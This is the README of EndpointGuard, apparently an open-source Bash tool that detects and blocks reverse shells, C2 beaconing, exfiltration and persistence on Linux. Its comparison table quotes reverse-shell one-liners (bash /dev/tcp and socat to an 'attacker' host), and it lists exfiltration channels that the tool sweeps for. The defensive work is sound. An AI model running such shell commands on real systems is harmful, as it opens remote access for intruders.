<div align="center">

# 🛡️ EndpointGuard v5.0
### Linux Sentinel — Real-time Reverse Shell, C2 & Persistence Hunter

```text
 _____           _point _____                      _ 
|   __|___ ___ _| |___  |   __| _ _ ___ ___ ___ _| |
|   __|   | . | . | . | |  |  || | | . |  _|  _| . |
|_____|_|_|  _|___|___| |_____|___|  _|_| |_| |___|
          |_|                     |_|              
```

[![Release](https://img.shields.io/badge/Release-v5.0.0-blueviolet?style=for-the-badge&logo=github)](CHANGELOG.md)
[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg?style=for-the-badge)](LICENSE)
[![Bash](https://img.shields.io/badge/Built_With-Bash-4EAA25?style=for-the-badge&logo=gnu-bash&logoColor=white)](https://www.gnu.org/software/bash/)
[![Platform](https://img.shields.io/badge/Platform-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)](https://www.linux.org/)
[![Security](https://img.shields.io/badge/Focus-Threat_Hunting-red?style=for-the-badge&logo=hackthebox&logoColor=white)](https://github.com/Mr-N1ck/EndpointGuard)
[![Documentation](https://img.shields.io/badge/Documentation-Guides-teal?style=for-the-badge&logo=readme)](docs/ARCHITECTURE.md)

> **EndpointGuard is a pure-Bash sentinel daemon designed to catch reverse shells, sever C2 communication, quarantine payloads, and clean persistence vectors on Linux hosts. It works via a polished interactive console interface.**

[🔬 Architecture Manual](docs/ARCHITECTURE.md) &nbsp;•&nbsp; [🛠️ Troubleshooting Guide](docs/TROUBLESHOOTING.md) &nbsp;•&nbsp; [📋 Changelog](CHANGELOG.md)

---

</div>

## 🚀 The Core Difference: How v5 Works

Most conventional Linux security agents inspect command strings (`ps` logs or command regexes). Attackers easily bypass this by calling shells with base64 payloads, preloaded libraries, or by renaming interpreters.

**EndpointGuard uses `/proc/<pid>/fd` inode inspection.** It directly interrogates active file descriptors to ask the core threat hunting question: 
> *"Is this shell process holding a network socket on stdin (`fd/0`), stdout (`fd/1`), or stderr (`fd/2`)?"*

If yes, it's a reverse shell. The shell language or command obfuscation is completely irrelevant.

### 📊 Detection Comparison Matrix

| Threat Type | Standard Agent / Regex | EndpointGuard v5 |
| :--- | :---: | :---: |
| `bash -i >& /dev/tcp/IP/PORT 0>&1` | ⚠️ Missed if forked/piped | **✅ Intercepted + Blocked** |
| `python -c "socket.connect()..."` | ❌ Obfuscated string bypass | **✅ Caught via FD Walk** |
| `socat TCP:attacker:port EXEC:bash` | ❌ Unknown executable string | **✅ Caught via FD Walk** |
| **Telegram / Discord C2 Exfil** | ❌ Logged as normal HTTPS | **✅ Flagged via Process Sweeper** |
| **Outbound C2 Beaconing** (60s loop) | ❌ Static logs only | **✅ Blocked via Variance Analyzer** |
| **Persistence backdoors** (cron/systemd) | ❌ Alert only | **✅ Cleaned + Pre-Backup + Quarantine** |
| **Active Socket after Kill** | ❌ Stays in `CLOSE_WAIT` | **✅ Severed via `ss -K` & `conntrack`** |

---

## ⚡ Main Interface & Setup Wizard

No configuration files to edit manually, and no command flags to memorize. Simply run `sudo endpointguard` to launch the interactive terminal interface:

```text
  🛡️ EndpointGuard v5.0 — Control Console
  =======================================
   1) Start protection daemon
   2) Restart protection daemon
   3) Run on-demand security scan
   4) Show status
   5) View logs / blocked / quarantine
   6) Block IP (manual)
   7) Unblock IP
   8) Test Telegram alerts
   9) Setup / reconfigure
  10) Install as systemd service (auto-start at boot)
  11) Restore files from quarantine
  12) Uninstall completely
  13) About / what's new
   0) Exit
```

On first launch, EndpointGuard runs a **Smart Setup Wizard** that:
* Auto-detects local interfaces, LAN subnets, and active administrative IPs.
* Creates a secure hardware configuration profile at `/opt/.epg/config.conf`.
* Integrates optional Telegram alerts for real-time intrusion broadcasts.
* Ensures **Automatic Lockout Prevention** so you never accidentally block your own session.

---

## 📦 Installation & Setup

Deploy EndpointGuard on any modern Linux kernel in seconds:

```bash
# Clone the repository
git clone https://github.com/Mr-N1ck/EndpointGuard.git
cd EndpointGuard

# Run the installer
sudo bash install.sh
```

Once installed, invoke the control console anytime:
```bash
sudo endpointguard
```

---

## 🔍 Under the Hood: Detection Engines

<details>
<summary><b>1. Deep Process Socket Walking <code>/proc/net</code></b> (Click to expand)</summary>

Every 3 seconds, the Sentinel daemon parses `/proc` to check:
1. Is the binary an interpreter or shell (`bash`, `python`, `node`, `php`, etc.)?
2. Are standard stream file descriptors pointing to a socket?
3. Resolves the socket inode to its remote IP.
4. Drops the connection instantly if the remote is external and non-whitelisted.
</details>

<details>
<summary><b>2. Exfil & C2 Sweep Engine</b> (Click to expand)</summary>

Continuously monitors `/tmp`, `/var/tmp`, `/dev/shm`, `/home/*`, and `/root/` for active exfiltration scripts. It uses regex sweeps to capture:
* Discord webhooks and webhook domains.
* Telegram bot tokens and message endpoints.
* SSH/HTTP tunnels (`ngrok`, `serveo`, `localtunnel`).
* Out-of-band collaboration interfaces (`webhook.site`, `pipedream`).
</details>

<details>
<summary><b>3. Sliding-Window Beaconing Analyzer</b> (Click to expand)</summary>

Calculates connection interval patterns to identify periodic C2 agents:
$$\sigma \le 30\text{ seconds over } 4\text{ consecutive logs}$$
If a background process connects to the same external destination on a strict interval with very low variance, the sentinel flags it as a C2 beacon, severs the socket, and blocks the IP.
</details>

<details>
<summary><b>4. Active Forensic Quarantine System</b> (Click to expand)</summary>

Rather than deleting files (which ruins forensics and incident response), EndpointGuard:
1. Strips all file permission bits (`chmod 000`).
2. Moves it to the protected sandbox: `/opt/.epg/quarantine/`.
3. Hashes the payload and logs the origin metadata.
4. Allows administrators to safely restore quarantined items anytime using **Option 11** in the TUI console.
</details>

---

## 🗂️ File Layout

All local configurations, databases, and logs are housed in a single organized directory:

```text
/opt/.epg/
├── endpointguard.sh          # Sentinel binary
├── config.conf               # Generated setup configurations
├── epg.log                   # Comprehensive event log
├── alerts.log                # CRITICAL / HIGH alerts only
├── blocked.list              # Actively banned IP database
├── killed_conns.log          # Connection sever logs
├── quarantine/               # Secure sandbox store (chmod 000)
│   └── quarantine.log        # Quarantine source database
├── honeypot/                 # Fake PTY environment for compromised accounts
├── baselines/                # File baseline hashes
└── pam_alerts.fifo           # Local inter-process FIFO channel
```

---

## 🔒 Security & Safe Handling

EndpointGuard is built for defensive sentinel operations. 

* **Owner IP Auto-Detection**: Always allowlists your current SSH connection IP during startup to prevent lockout.
* **Granular Modes**: Run in `monitor` mode for zero active changes (safe on production databases), `moderate` for passive blocking, or `active` for full sentinel execution.
* For security disclosures or vulnerabilities, please review [SECURITY.md](SECURITY.md).

---

<div align="center">

Built with 🛡️ by **Prince Gaur** ([@Mr-N1ck](https://github.com/Mr-N1ck)) for the open-source Linux security community.

*If EndpointGuard helped secure your servers, please drop a ⭐ on the repository!*

</div>
